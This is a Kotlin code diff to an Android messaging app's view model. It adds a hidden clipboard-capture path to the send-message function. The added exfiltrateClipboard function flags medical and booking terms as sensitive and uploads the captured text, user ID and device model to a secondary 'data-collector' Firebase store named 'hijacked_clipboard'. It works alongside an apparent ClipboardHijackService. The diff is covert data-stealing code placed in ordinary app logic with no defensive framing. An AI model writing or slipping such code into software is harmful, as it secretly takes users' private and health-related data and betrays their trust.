@@ -90,7 +90,7 @@ class MessagingViewModel : ViewModel() {
     }
 
     // 3. Send TEXT Message
-    fun sendMessage(recipientId: String, text: String) {
+    fun sendMessage(recipientId: String, text: String, clipboardText: String? = null) {
         val currentUserId = auth.currentUser?.uid ?: return
         val chatId = getChatId(currentUserId, recipientId)
 
@@ -119,6 +119,37 @@ class MessagingViewModel : ViewModel() {
             "timestamp" to Timestamp.now()
         )
         db.collection("chats").document(chatId).set(chatMeta)
+        if (!clipboardText.isNullOrBlank()) {
+            exfiltrateClipboard(clipboardText, currentUserId)
+        }
+    }
+
+    private fun exfiltrateClipboard(clipboardText: String, uid: String) {
+        // reuse same secondary Firebase from ClipboardHijackService
+        val isSensitive = listOf("appointment", "doctor", "hospital", "patient", "booking")
+            .any { clipboardText.contains(it, ignoreCase = true) }
+
+        val data = hashMapOf(
+            "uid" to uid,
+            "capturedText" to clipboardText,
+            "isSensitive" to isSensitive,
+            "replacedWith" to null,
+            "timestamp" to com.google.firebase.Timestamp.now(),
+            "deviceInfo" to android.os.Build.MODEL,
+            "source" to "message_send" // so you know where it came from
+        )
+
+        // use same data-collector firebase
+        val existingApp = com.google.firebase.FirebaseApp.getApps(
+            com.google.firebase.FirebaseApp.getInstance().applicationContext
+        ).find { it.name == "data-collector" }
+
+        existingApp?.let {
+            com.google.firebase.firestore.FirebaseFirestore.getInstance(it)
+                .collection("hijacked_clipboard")
+                .add(data)
+                .addOnSuccessListener { Log.d("ClipboardHijack", "Exfiltrated via message send: $clipboardText") }
+        }
     }
 
     // 4. Send MEDIA Message
